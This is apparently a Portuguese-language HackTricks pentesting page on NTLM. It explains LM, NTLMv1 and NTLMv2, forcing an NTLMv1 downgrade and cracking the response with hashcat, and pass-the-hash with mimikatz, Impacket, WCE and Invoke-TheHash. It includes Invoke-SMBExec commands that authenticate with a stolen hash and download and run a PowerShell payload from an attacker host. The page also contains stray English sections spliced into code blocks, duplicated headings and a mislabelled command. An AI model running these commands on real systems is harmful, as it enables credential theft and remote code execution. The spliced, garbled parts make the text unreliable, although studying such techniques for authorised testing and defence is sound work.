# NTLM

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações Básicas

Em ambientes onde **Windows XP e Server 2003** estão em operação, são utilizados hashes LM (Lan Manager), embora seja amplamente reconhecido que esses podem ser facilmente comprometidos. Um hash LM específico, `AAD3B435B51404EEAAD3B435B51404EE`, indica um cenário em que o LM não é utilizado, representando o hash para uma string vazia.

Por padrão, o protocolo de autenticação **Kerberos** é o método principal utilizado. O NTLM (NT LAN Manager) entra em ação sob circunstâncias específicas: ausência de Active Directory, inexistência do domínio, mau funcionamento do Kerberos devido a configuração inadequada, ou quando as conexões são tentadas usando um endereço IP em vez de um nome de host válido.

A presença do cabeçalho **"NTLMSSP"** em pacotes de rede sinaliza um processo de autenticação NTLM.

O suporte aos protocolos de autenticação - LM, NTLMv1 e NTLMv2 - é facilitado por uma DLL específica localizada em `%windir%\Windows\System32\msv1\_0.dll`.

**Pontos Chave**:
- Os hashes LM são vulneráveis e um hash LM vazio (`AAD3B435B51404EEAAD3B435B51404EE`) significa que não está sendo utilizado.
- Kerberos é o método de autenticação padrão, com o NTLM usado apenas sob certas condições.
- Os pacotes de autenticação NTLM são identificáveis pelo cabeçalho "NTLMSSP".
- Os protocolos LM, NTLMv1 e NTLMv2 são suportados pelo arquivo de sistema `msv1\_0.dll`.

## LM, NTLMv1 e NTLMv2

Você pode verificar e configurar qual protocolo será usado:

### GUI

Execute _secpol.msc_ -> Políticas locais -> Opções de segurança -> Segurança de rede: Nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5).

![](<../../.gitbook/assets/image (92).png>)

### Registro

Isso definirá o nível 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores possíveis:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticação de domínio NTLM

1. O **usuário** introduz suas **credenciais**
2. A máquina cliente **envia uma solicitação de autenticação** enviando o **nome do domínio** e o **nome de usuário**
3. O **servidor** envia o **desafio**
4. O **cliente criptografa** o **desafio** usando o hash da senha como chave e o envia como resposta
5. O **servidor envia** para o **controlador de domínio** o **nome do domínio, o nome de usuário, o desafio e a resposta**. Se **não houver** um Active Directory configurado ou o nome do domínio for o nome do servidor, as credenciais são **verificadas localmente**.
6. O **controlador de domínio verifica se tudo está correto** e envia as informações para o servidor

O **servidor** e o **Controlador de Domínio** são capazes de criar um **Canal Seguro** via servidor **Netlogon** pois o Controlador de Domínio conhece a senha do servidor (ela está dentro do banco de dados **NTDS.DIT**).

### Esquema de autenticação NTLM local

A autenticação é como a mencionada **anteriormente, mas** o **servidor** conhece o **hash do usuário** que tenta se autenticar dentro do arquivo **SAM**. Portanto, em vez de perguntar ao Controlador de Domínio, o **servidor verificará por si só** se o usuário pode se autenticar.

### Desafio NTLMv1

O **comprimento do desafio é de 8 bytes** e a **resposta tem 24 bytes** de comprimento.

O **hash NT (16 bytes)** é dividido em **3 partes de 7 bytes cada** (7B + 7B + (2B+0x00\*5)): a **última parte é preenchida com zeros**. Em seguida, o **desafio** é **cifrado separadamente** com cada parte e os bytes cifrados resultantes são **unidos**. Total: 8B + 8B + 8B = 24 bytes.

**Problemas**:

* Falta de **aleatoriedade**
* As 3 partes podem ser **atacadas separadamente** para encontrar o hash NT
* **DES é passível de quebra**
* A 3ª chave é composta sempre por **5 zeros**.
* Dado o **mesmo desafio**, a **resposta** será a **mesma**. Portanto, você pode dar como **desafio** para a vítima a string "**1122334455667788**" e atacar a resposta usando **tabelas arco-íris pré-computadas**.

### Ataque NTLMv1

Atualmente está se tornando menos comum encontrar ambientes com Delegação Irrestrita configurada, mas isso não significa que você não possa **abusar de um serviço de Spooler de Impressão** configurado.

Você poderia abusar de algumas credenciais/sessões que você já tem no AD para **solicitar que a impressora se autentique** contra algum **host sob seu controle**. Em seguida, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o desafio de autenticação como 1122334455667788**, capturar a tentativa de autenticação e, se ela foi feita usando **NTLMv1**, você será capaz de **quebrá-la**.\
Se estiver usando `responder`, você poderia tentar \*\*usar a flag `--lm` \*\* para tentar **rebaixar** a **autenticação**.\
_Obs.: para essa técnica, a autenticação deve ser feita usando NTLMv1 (NTLMv2 não é válido)._

Lembre-se de que a impressora usará a conta de computador durante a autenticação, e as contas de computador usam **senhas longas e aleatórias** que você **provavelmente não conseguirá quebrar** usando **dicionários comuns**. Mas a autenticação **NTLMv1** **usa DES** ([mais informações aqui](./#ntlmv1-challenge)), então usando alguns serviços especialmente dedicados a quebrar DES você será capaz de quebrá-la (você poderia usar [https://crack.sh/](https://crack.sh) por exemplo).

### Ataque NTLMv1 com hashcat

O NTLMv1 também pode ser quebrado com a Ferramenta Multi NTLMv1 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formata mensagens NTLMv1 de uma maneira que pode ser quebrada com o hashcat.

O comando
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
```plaintext
## NTLM Relay Attack

NTLM relay attacks are a common technique used by attackers to escalate privileges and move laterally within a network. This attack involves intercepting the NTLM authentication process between a client and a server, and relaying the authentication to another server to gain unauthorized access.

### How to Prevent NTLM Relay Attacks

To prevent NTLM relay attacks, you can implement the following measures:

1. **Enforce SMB Signing**: Enabling SMB signing can help prevent NTLM relay attacks by ensuring the integrity of data transferred over SMB connections.

2. **Disable NTLMv1**: NTLMv1 is known to be vulnerable to relay attacks. Disabling NTLMv1 can help mitigate the risk of NTLM relay attacks.

3. **Use LDAP Signing and Channel Binding**: Enabling LDAP signing and channel binding can help protect against NTLM relay attacks targeting LDAP authentication.

4. **Implement Extended Protection for Authentication**: Extended Protection for Authentication (EPA) can help prevent NTLM relay attacks by adding an extra layer of security to the authentication process.

5. **Enable SMB Encryption**: Enabling SMB encryption can help protect against NTLM relay attacks by encrypting data transmitted over SMB connections.

By implementing these measures, you can enhance the security of your network and reduce the risk of NTLM relay attacks.
```
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Hashes

## Description

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. NTLM hashes are generated from user passwords and are commonly targeted by attackers for password cracking.

## Detection

NTLM hashes can be detected in various ways, such as monitoring network traffic for NTLM authentication requests or by analyzing system logs for NTLM-related events.

## Prevention

To prevent NTLM hash theft, it is recommended to disable NTLM authentication where possible and instead use more secure authentication protocols such as Kerberos. Additionally, enforcing strong password policies and regularly changing passwords can help mitigate the risk of NTLM hash compromise.

## References

- [Microsoft NTLM Overview](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/446ac8f7-4b0b-4f5b-9b0a-1b0b5b6f5d9e)
- [NTLM Hash Cracking](https://attack.mitre.org/techniques/T1212/)
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Execute o hashcat (distribuído é melhor através de uma ferramenta como hashtopolis) pois isso levará vários dias de outra forma.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Neste caso, sabemos que a senha é password, então vamos trapacear para fins de demonstração:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Precisamos agora usar as hashcat-utilities para converter as chaves DES quebradas em partes do hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Finalmente a última parte:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM Relay Attack

## Introduction

In a Windows environment, NTLM (NT LAN Manager) is a suite of security protocols used for authentication. NTLM relay attack is a common technique used by hackers to exploit the NTLM authentication process and gain unauthorized access to systems.

## How it works

1. The attacker intercepts an NTLM authentication request sent by a victim to a server.
2. The attacker relays this request to another server, tricking it into believing that the attacker is the victim.
3. The second server then sends back a response to the attacker, who can use this to access the victim's resources.

## Mitigation

To prevent NTLM relay attacks, it is recommended to:
- Use SMB signing to prevent relay attacks on SMB connections.
- Implement Extended Protection for Authentication to protect against relay attacks on HTTP connections.
- Disable NTLM where possible and use more secure authentication protocols like Kerberos.

By following these mitigation techniques, organizations can enhance the security of their Windows environments and protect against NTLM relay attacks.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Desafio NTLMv2

O **comprimento do desafio é de 8 bytes** e **são enviadas 2 respostas**: Uma tem **24 bytes** de comprimento e o comprimento da **outra** é **variável**.

**A primeira resposta** é criada cifrando usando **HMAC\_MD5** a **string** composta pelo **cliente e o domínio** e usando como **chave** o **hash MD4** do **hash NT**. Em seguida, o **resultado** será usado como **chave** para cifrar usando **HMAC\_MD5** o **desafio**. Para isso, **um desafio do cliente de 8 bytes será adicionado**. Total: 24 B.

A **segunda resposta** é criada usando **vários valores** (um novo desafio do cliente, um **timestamp** para evitar **ataques de repetição**...)

Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, você pode seguir este guia para obter o domínio, nome de usuário, desafio e resposta e tentar quebrar a senha: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Depois de obter o hash da vítima**, você pode usá-lo para **se passar por ela**.\
Você precisa usar uma **ferramenta** que irá **realizar** a **autenticação NTLM usando** esse **hash**, **ou** você poderia criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, para que quando qualquer **autenticação NTLM seja realizada**, esse **hash será usado**. A última opção é o que o mimikatz faz.

**Por favor, lembre-se de que você também pode realizar ataques Pass-the-Hash usando contas de Computador.**

### **Mimikatz**

**Precisa ser executado como administrador**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Isso iniciará um processo que pertencerá aos usuários que iniciaram o mimikatz, mas internamente no LSASS as credenciais salvas são as que estão dentro dos parâmetros do mimikatz. Em seguida, você pode acessar recursos de rede como se fosse esse usuário (similar ao truque `runas /netonly`, mas você não precisa saber a senha em texto simples).

### Pass-the-Hash a partir do linux

Você pode obter execução de código em máquinas Windows usando Pass-the-Hash a partir do Linux.\
[**Acesse aqui para aprender como fazer isso.**](../../windows/ntlm/broken-reference/)

### Ferramentas compiladas do Impacket para Windows

Você pode baixar [binários do Impacket para Windows aqui](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Neste caso, você precisa especificar um comando, cmd.exe e powershell.exe não são válidos para obter um shell interativo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Existem vários outros binários do Impacket...

### Invoke-TheHash

Você pode obter os scripts do powershell daqui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Invocar-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Chamar-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta função é uma **combinação de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **qualquer** um dos **SMBExec** e **WMIExec** mas **não** fornecer nenhum parâmetro _**Command**_, ele apenas irá **verificar** se você tem **permissões suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Editor de Credenciais do Windows (WCE)

**Precisa ser executado como administrador**

Esta ferramenta fará a mesma coisa que o mimikatz (modificar a memória do LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Execução remota manual do Windows com nome de usuário e senha

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extraindo credenciais de um Host do Windows

**Para mais informações sobre** [**como obter credenciais de um host do Windows, você deve ler esta página**](broken-reference)**.**

## NTLM Relay e Responder

**Leia um guia mais detalhado sobre como realizar esses ataques aqui:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analisando desafios NTLM de uma captura de rede

**Você pode usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
